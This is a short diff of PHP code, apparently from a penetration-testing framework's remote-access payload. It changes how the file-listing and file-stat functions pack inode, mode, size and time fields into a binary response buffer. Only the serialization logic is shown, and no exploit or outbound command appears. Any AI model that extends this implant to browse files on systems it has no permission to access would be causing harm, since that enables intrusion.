@@ -450,13 +450,13 @@ function stdapi_fs_ls($req, &$pkt) {
                 $st = stat($path . DIRECTORY_SEPARATOR . $file);
                 $st_buf = "";
                 $st_buf .= pack("V", $st['dev']);
-                $st_buf .= pack("v", $st['ino']);
-                $st_buf .= pack("v", $st['mode']);
-                $st_buf .= pack("v", $st['nlink']);
-                $st_buf .= pack("v", $st['uid']);
-                $st_buf .= pack("v", $st['gid']);
-                $st_buf .= pack("v", 0);
+                $st_buf .= pack("V", $st['ino']);
+                $st_buf .= pack("V", $st['mode']);
+                $st_buf .= pack("V", $st['nlink']);
+                $st_buf .= pack("V", $st['uid']);
+                $st_buf .= pack("V", $st['gid']);
                 $st_buf .= pack("V", $st['rdev']);
+                $st_buf .= pack("V", 0);
                 $st_buf .= pack("V", $st['size']);
                 $st_buf .= pack("V", $st['atime']);
                 $st_buf .= pack("V", $st['mtime']);
@@ -493,19 +493,16 @@ function stdapi_fs_stat($req, &$pkt) {
     if ($st) {
         $st_buf = "";
         $st_buf .= pack("V", $st['dev']);
-        $st_buf .= pack("v", $st['ino']);
-        $st_buf .= pack("v", $st['mode']);
-        $st_buf .= pack("v", $st['nlink']);
-        $st_buf .= pack("v", $st['uid']);
-        $st_buf .= pack("v", $st['gid']);
-        $st_buf .= pack("v", 0);
+        $st_buf .= pack("V", $st['mode']);
+        $st_buf .= pack("V", $st['nlink']);
+        $st_buf .= pack("V", $st['uid']);
+        $st_buf .= pack("V", $st['gid']);
         $st_buf .= pack("V", $st['rdev']);
-        $st_buf .= pack("V", $st['size']);
-        $st_buf .= pack("V", $st['atime']);
-        $st_buf .= pack("V", $st['mtime']);
-        $st_buf .= pack("V", $st['ctime']);
-        $st_buf .= pack("V", $st['blksize']);
-        $st_buf .= pack("V", $st['blocks']);
+        $st_buf .= pack("P", $st['ino']);
+        $st_buf .= pack("P", $st['size']);
+        $st_buf .= pack("P", $st['atime']);
+        $st_buf .= pack("P", $st['mtime']);
+        $st_buf .= pack("P", $st['ctime']);
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
         return ERROR_SUCCESS;
     } else {
